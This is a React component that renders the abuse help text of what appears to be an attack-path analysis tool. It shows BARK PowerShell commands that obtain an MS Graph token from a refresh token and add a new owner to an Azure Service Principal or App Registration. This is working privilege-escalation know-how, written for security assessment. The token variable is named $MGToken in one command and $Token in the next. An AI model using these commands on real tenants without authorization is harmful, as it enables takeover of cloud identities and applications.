import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                You can use BARK to add a new owner to the target object. The 
                BARK function you use will depend on the target object type, 
                but all of the functions follow a similar syntax.
            </p>

            <p>
                These functions require you to supply an MS Graph-scoped JWT
                associated with the principal that has the privilege to add a
                new owner to your target object. There are several ways to
                acquire a JWT. For example, you may use BARK’s
                Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT
                by supplying a refresh token:
            </p>

                <pre>
                    <code>
                        {
                            '$MGToken = Get-GraphTokenWithRefreshToken `\n' +
                            '    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n' +
                            '    -TenantID "contoso.onmicrosoft.com"'
                        }
                    </code>
                </pre>

            <p>
                To add a new owner to a Service Principal, use BARK's 
                New-ServicePrincipalOwner function:
            </p>
            
                <pre>
                    <code>
                        {
                            'New-ServicePrincipalOwner `\n' +
                            '    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `\n' +
                            '    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n' +
                            '    -Token $Token'
                        }
                    </code>
                </pre>

            <p>
                To add a new owner to an App Registration, use BARK's New-AppOwner function:
            </p>

                <pre>
                    <code>
                        {
                            'New-AppOwner `\n' +
                            '    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `\n' +
                            '    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n' +
                            '    -Token $Token'
                        }
                    </code>
                </pre>
            
        </>
    );
};

export default Abuse;
